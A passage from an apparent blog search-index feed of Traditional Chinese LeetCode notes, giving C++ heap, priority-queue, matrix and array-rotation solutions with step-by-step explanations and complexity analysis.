就越小</p></blockquote><blockquote><p><strong>為何是 <code>n+1</code> ?</strong><br>因為題目的條件會是如果有兩個相同的任務，它們之間必須間隔至少 <code>n</code> 個不同任務或 idle，也就是說，當你執行了一個任務後，要「等 n 步」它才能再出現。 所以今天如果出現 <code>A</code>任務，那從這個<code>A</code> 到下個 <code>A</code> 出現一共會佔掉 <code>n+1</code> 個intervals</p></blockquote><p>以下講解code的部分：<br>首先定義 priority queue 會是 <code>maxHeap</code>，並且我們需要一個額外紀錄任務類型頻率的陣列 <code>charCount</code>，這便迭代 <code>tasks</code> 並計算個別任務出現次數，同樣對於CPU來說，也代表 <strong>每個字母還剩幾次要做</strong></p><p>之後會需要把大於0，也就是實際有出現的任務類型的次數，推入 <code>maxheap</code> 當中。這時候 <code>maxHeap</code> 的 top 會是出現次數頻率最高的任務。接著宣告用於記錄用的 <code>intervals</code>。這裡即將開始插空隙：起初我們會宣告一個陣列 <code>temp</code> 它的用途是用來放本輪 (<code>cycle</code>)中被拿來執行過，但仍有剩餘次數的那些任務，等差這輪結束後再丟回 heap。</p><p><code>cycle</code> 則代表本輪剩餘可排列的格子數，起初會是 <code>n+1</code> 每安排一次任務或idle 就會減一。所以一開始宣告 <code>cycle = n+1</code> 之後當這輪結束前就會去拿去排格子，具體行為就是要去把 heap中的任務拿出來 (<code>int count = maxHeap.top();</code>) 扣一後，然後放入 <code>temp</code> 此時就代表這輪中排了一個任務，<code>cycle--</code>然後 <code>interval</code> 增加。內層迴圈在插入一個任務後，就會從 heap中選另一個剩餘次數最高的任務起來做，之後一樣丟入 <code>temp</code> 重複步驟</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">步驟舉例 </summary><div class="toggle-content"><p>以範例 tasks &#x3D; [A,A,A,B,B,B ], n &#x3D; 2 逐輪說明</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ul><li><code>charCount</code>: A&#x3D;3, B&#x3D;3，其餘 0</li><li><code>maxHeap</code>: [3, 3]（順序表示堆中值，不是排序陣列）</li><li><code>intervals</code> &#x3D; 0</li></ul><h3 id="第-1-輪（cycle-3）"><a href="#第-1-輪（cycle-3）" class="headerlink" title="第 1 輪（cycle = 3）"></a>第 1 輪（<code>cycle = 3</code>）</h3><ul><li>取出 3（A）→ 做一次，剩 2 → <code>temp = [2]</code>，<code>intervals = 1</code>，<code>cycle = 2</code></li><li>取出 3（B）→ 做一次，剩 2 → <code>temp = [2,2]</code>，<code>intervals = 2</code>，<code>cycle = 1</code></li><li>已空，內圈結束</li><li>把 <code>temp</code> 的 [2,2] 丟回堆 → <code>maxHeap</code> &#x3D; [2,2]</li><li>堆還不空，代表這一輪剩下 1 格要補 idle → <code>intervals += cycle(=1)</code> → <code>intervals = 3</code></li></ul><h3 id="第-2-輪（cycle-3）"><a href="#第-2-輪（cycle-3）" class="headerlink" title="第 2 輪（cycle = 3）"></a>第 2 輪（<code>cycle = 3</code>）</h3><ul><li>取出 2（A）→ 做一次，剩 1 → <code>temp = [1]</code>，<code>intervals = 4</code>，<code>cycle = 2</code></li><li>取出 2（B）→ 做一次，剩 1 → <code>temp = [1,1]</code>，<code>intervals = 5</code>，<code>cycle = 1</code></li><li>堆已空，內圈結束</li><li>丟回 <code>temp</code>→ <code>maxHeap = [1,1]</code></li><li>堆還不空 → 補 idle 1 格 → <code>intervals = 6</code></li></ul><h3 id="第-3-輪（cycle-3）"><a href="#第-3-輪（cycle-3）" class="headerlink" title="第 3 輪（cycle = 3）"></a>第 3 輪（<code>cycle = 3</code>）</h3><ul><li>取出 1（A）→ 做一次，剩 0 → 不進 <code>temp</code>，<code>intervals = 7</code>，<code>cycle = 2</code></li><li>取出 1（B）→ 做一次，剩 0 → 不進 <code>temp</code>，<code>intervals = 8</code>，<code>cycle = 1</code></li><li>丟回 <code>temp</code>（空）→ 堆為空</li><li>堆已空 → 不需要補 idle（因為全部完成了）</li></ul><p>最後 <code>intervals = 8</code>，對應排程： <code>A, B, idle, A, B, idle, A, B</code></p></div></details><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/621/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度： $O(N)$, N 為 <code>task.size()</code></p><p>空間複雜度: $O(1)$，頻率表為 $O(26)$, 而 <code>maxHeap</code> 當中最多 K個元素為，$O(K)$ K在本題為26算是固定限制，因此會是 $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Heap </tag>
            
            <tag> Priority Queue </tag>
            
            <tag> Greedy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K個距離原點最近的點 | Medium | LeetCode#973. K Closest Points to Origin</title>
      <link href="/posts/33dda161.html"/>
      <url>/posts/33dda161.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/973/question1.png"><br><img src="/img/LeetCode/973/question2.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 題目給定一個陣列 <code>points</code> 其中 <code>points[i] = [xi, yi]</code> 代表在X-Y座標軸中任意點的位置，給定整數 <code>k</code> 求 <code>k</code> 個最靠近原點(<code>0,0</code>)的點</li></ul><blockquote><p>兩點之間求距離公式： <code>√(x1 - x2)2 + (y1 - y2)2</code></p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>我一開始的想法會是因為求 <code>k</code> 個距離近的點，而距離近代表離原點數字小，因此要用 max Heap 來解，但是我希望在 maxHeap 中放入的會是座標本身，然後排序方式就用距離大小來排，因此會需要自定義 comparator</p><blockquote><p>這邊關於使用 lambda 語法定義 comparator 可以參考這篇：<a href="https://notes.boshkuo.com/docs/C++/STL/priority_queue">https://notes.boshkuo.com/docs/C++/STL/priority_queue</a></p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">auto</span> comparator = [](<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; leftVec, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; rightVec) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> d1 = <span class="number">1LL</span> * leftVec[<span class="number">0</span>] * leftVec[<span class="number">0</span>] + <span class="number">1LL</span> * leftVec[<span class="number">1</span>] * leftVec[<span class="number">1</span>];</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> d2 = <span class="number">1LL</span> * rightVec[<span class="number">0</span>] * rightVec[<span class="number">0</span>] + <span class="number">1LL</span> * rightVec[<span class="number">1</span>] * rightVec[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> d1 &gt; d2;</span><br><span class="line">        &#125;;</span><br><span class="line">        priority_queue&lt;vector&lt;<span class="type">int</span>&gt;,vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;, <span class="keyword">decltype</span>(comparator)&gt; <span class="built_in">distanceHeap</span>(comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span>&amp;p: points)&#123;</span><br><span class="line">            distanceHeap.<span class="built_in">push</span>(p);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">        result.<span class="built_in">reserve</span>(k);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;k; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!distanceHeap.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                result.<span class="built_in">push_back</span>(distanceHeap.<span class="built_in">top</span>());</span><br><span class="line">                distanceHeap.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這邊會去定義一個 priority queue <code>distanceHeap</code> 但請注意宣告內容，因為要放的會是座標，因此內部的值要是 <code>vector&lt;int&gt;</code> 然後整個 PQ會用 <code>vector&lt;vector&lt;int&gt;&gt;</code> 來儲存，而判斷大小用的 comparator 定義在上方。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> comparator = [](<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; leftVec, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; rightVec) &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> d1 = <span class="number">1LL</span> * leftVec[<span class="number">0</span>] * leftVec[<span class="number">0</span>] + <span class="number">1LL</span> * leftVec[<span class="number">1</span>] * leftVec[<span class="number">1</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> d2 = <span class="number">1LL</span> * rightVec[<span class="number">0</span>] * rightVec[<span class="number">0</span>] + <span class="number">1LL</span> * rightVec[<span class="number">1</span>] * rightVec[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> d1 &gt; d2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這邊定義兩個參數 <code>leftVec</code> 以及 <code>rightVec</code> 用來比較兩個座標誰距離原點比較近，但其實不用真的去做平方根，只要做到平方相加就好，但也因此會需要使用 <code>long long</code> 行別的變數來存放。 並且距離小的先放(放在heap頂端)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span>&amp;p: points)&#123;</span><br><span class="line">    distanceHeap.<span class="built_in">push</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦 PQ 宣告結束後，就可以把整個 <code>points</code> 當中的座標放入 <code>distanceHeap</code>中。 最後透過一個迴圈，來將heap底部的元素(距離較近的元素)彈出，並且加入到回傳陣列 <code>result</code> 當中。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/973/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度：$O(NLogN)$</p><p>空間複雜度：$O(N)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Heap </tag>
            
            <tag> Priority Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陣列中第K大的元素 | Medium | LeetCode#215. Kth Largest Element in an Array</title>
      <link href="/posts/d91391c2.html"/>
      <url>/posts/d91391c2.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/215/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 題目給定整數陣列 <code>nums</code> 以及整數 <code>k</code>，請回傳陣列中第 <code>k</code> 個大的元素。特別注意，會是需要由大到小第<code>k</code>個元素，並不是第<code>k</code>大的相異元素</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">minHeap</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">begin</span>()+k);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=k; i&lt;nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;minHeap.<span class="built_in">top</span>())&#123;</span><br><span class="line">                minHeap.<span class="built_in">pop</span>();</span><br><span class="line">                minHeap.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minHeap.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這邊一樣透過 priority queue去解，並且一樣需要用到 min heap，這裡先把 <code>nums</code> 中的前k個元素放入 PQ <code>minHeap</code> 裡面，此時的 heap size 大小會是 <code>k</code> 但裡面的元素並不一定真的會是前k個大的元素，因此剩下的元素，需要一個一個判斷，如果接下來在 <code>nums</code> 中的元素大於當前 heap 中的最大值 (<code>minheap.top()</code>) 此時需要更新 <code>heap</code> 中的元素，需要把當前的 <code>heap</code> 中最大值pop出來，並且把 <code>nums[i]</code> 元素推入 heap 底部。</p><p>如果迭代完 <code>nums</code> 則直接回傳 heap 中最大值即可。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/215/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度: $O(nLogk)$</p><p>空間複雜度：$O(k)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Heap </tag>
            
            <tag> Priority Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字流中第K大的元素 | Easy | LeetCode#703. Kth Largest Element in a Stream</title>
      <link href="/posts/e936e1ac.html"/>
      <url>/posts/e936e1ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/703/question.png"></p><ul><li>題目難度：<code>Easy</code></li><li>題目描述： 你是某大學入學審核辦公室的人，你需要動態即時追縱所有申請裡面前 Kth 個高分的成績， 請設計一個 class，在具有參數整數 <code>k</code>，並在插入新成績後回傳第 <code>k</code> 高分的成績。 請實作 <code>KthLargest</code> class:<ul><li><code>KthLargest(int k, int[] nums)</code> 負責初始化整數 <code>k</code> 物件以及用來存放考試成績的陣列 <code>nums</code></li><li><code>int add(int val)</code> 負責添加新成績 <code>val</code> 到stream 並且需要再添加成績後回傳到目前為止第<code>k</code>個高分的成績</li></ul></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KthLargest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> k;</span><br><span class="line">        priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; minHeap;</span><br><span class="line">        <span class="built_in">KthLargest</span>(<span class="type">int</span> k, vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;k = k;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> num: nums)&#123;</span><br><span class="line">                <span class="built_in">add</span>(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">            minHeap.<span class="built_in">push</span>(val);</span><br><span class="line">            <span class="keyword">if</span>(minHeap.<span class="built_in">size</span>()&gt; k)&#123;</span><br><span class="line">                minHeap.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> minHeap.<span class="built_in">top</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your KthLargest object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * KthLargest* obj = new KthLargest(k, nums);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;add(val);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>這題的主要目的是要練習 Heap 以及 Priority Queue 的使用， <strong>首先可能看到如果是要及時的知道第<code>k</code> 的大的元素，那應該就會需要想到使用 min heap，因為這樣 root節點就會是最小值，leaf節點會是最大值，會較早pop出來</strong></p><p>這題會先定義 priority queue，並且會需要用到 min heap 所以會是 <code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt;</code> 。而初始化用的建構子除了初始化成員變數 <code>k</code> 之外，還需要呼叫 <code>add</code> 函數將 <code>nums</code> 陣列中的分數放入 priority queue。</p><p><code>add</code> 函數則需要先將成績放進PQ中，並且只要當 <code>minHeap</code> 的大小大於 <code>k</code> 那就把最大的元素pop出來，直到 &#x3D; <code>k</code> 為止，一旦等於則透過  <code>minHeap.top()</code> 取出當前的最大元素</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/703/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度： $O(logk)$<br>空間複雜度： $O(k)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Heap </tag>
            
            <tag> Priority Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旋轉圖片 | Medium | LeetCode#48. Rotate Image</title>
      <link href="/posts/a68b0f6a.html"/>
      <url>/posts/a68b0f6a.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/48/question.jpeg"></p><ul><li>題目難度: <code>medium</code> </li><li>題目敘述: 題目給定一個 <code>matrix</code> 請將其順時針旋轉一次，並且必須 in-place修改，也就是不能宣告額外二元陣列去儲存元素</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題我是畫圖直接看矩陣關係</p><p><img src="/img/LeetCode/48/algo1.png"></p><p>首先其實觀察 <code>matrix</code> 再經過一次順時針旋轉後的位置，然後比對原本的，可以發現一些關係。旋轉的過程也只是列元素變成行元素，可以觀察到 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- matrix[0][0] = matrix[0][2]</span><br><span class="line">- matrix[1][0] = matrix[0][1]</span><br><span class="line">- matrix[2][0]  = matrix[0][0]</span><br></pre></td></tr></table></figure><p>透過上面關係可以發現， <strong>順時鐘旋轉一次，其實只是先將 <code>matrix</code> 相同 column 元素全部 reversed 排列後，再去進行對稱的過程。</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p><img src="/img/LeetCode/48/algo2.png"></p><p>不過實際在解的時候，如果要對每一個 column 元素進行反序排列，會橫跨不同子陣列的元素交換，處理上比較不直觀， <strong>因此我發現其實也可以先反序排列同一列元素再進行對稱，只不過這樣的結果會是原本 <code>matrix</code> 逆時針轉一次，但是其實逆時針轉三次就等於順時針轉一次。</strong> </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n = matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(counter &lt;<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="comment">// reversed subVec</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n;i++)&#123;</span><br><span class="line">                <span class="built_in">reverse</span>(matrix[i].<span class="built_in">begin</span>(), matrix[i].<span class="built_in">end</span>());</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//symmetric</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">                <span class="type">int</span> temp=<span class="number">0</span>;</span><br><span class="line">                <span class="comment">// only need to execute the lower-left triabgle</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=i; j&lt;n; j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i!=j)&#123;</span><br><span class="line">                        temp = matrix[i][j];</span><br><span class="line">                        matrix[i][j] = matrix[j][i];</span><br><span class="line">                        matrix[j][i] = temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            counter++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面要特別注意在交換元素時，迴圈不要迭代所有元素，只要迭代矩陣的左-下三角元素即可，若你迭代所有元素，那結果會保持不變，例如迭代到 <code>[0][1]</code> 用 <code>[1][0]</code> 元素替換，但是你再迭代到 <code>[1][0]</code> 時，又會把原本的元素換回來 </p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/48/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(n^2)$</p><p>空間複雜度<br>$O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Matrix </tag>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旋轉陣列 | Medium | LeetCode#189. Rotate Array</title>
      <link href="/posts/b5a764d5.html"/>
      <url>/posts/b5a764d5.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/189/question.png"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 題目給定一個整數陣列，請旋轉該陣列元素到右邊 <code>k</code> 次，其中 <code>k</code> 為非負整數</li></ul><div class="note info flat"><p>這裡的陣列會是一維陣列，旋轉的意思是尾端元素移動到首端，其餘元素跟著連帶移動。</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我首先觀察到 <code>k</code> 的範圍會是 <code>0 &lt;= k &lt;= 10^5</code> 因此會需要對 <code>k</code> 取餘數看最少旋轉幾次。另外就是旋轉的方法，最直觀就會是透過迴圈把尾端元素不斷往首端放，但是 <code>nums.length</code> 範圍挺廣，這樣不停移動剩下元素，時間複雜度會到 $O(n^2)$ 肯定會 time limit exceeded。</p><p>我想到另一個方法，就是找插入點，看題目給的測資可以發現，旋轉幾次其實只是取末端元素數量不同而已，然後再把末端整組元素接回首端，就能夠完成旋轉。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        k = k % n;</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">temp</span><span class="params">(k)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;k; i++)&#123;</span><br><span class="line">            temp[i] = nums[n-k+i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>; i&gt;=k; i--)&#123;</span><br><span class="line">            nums[i] = nums[i-k];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;k; i++)&#123;</span><br><span class="line">            nums[i] = temp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先跟剛剛講得一樣，先判斷最少需要旋轉幾次，所以先對 <code>k</code> 取餘數。如果是 0 就直接回傳，代表不用旋轉。 另外會需要知道，旋轉 <code>k</code> 次，等同於從第幾個元素開始接到首端，這裡同樣可以觀察到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nums = [1, 2, 3, 4, 5, 6, 7]</span><br><span class="line">n = nums.length()</span><br><span class="line"></span><br><span class="line">K=1 取 [7] 接到 [1,2,3,4,5,6]</span><br><span class="line">K=2 取 [6,7] 接到 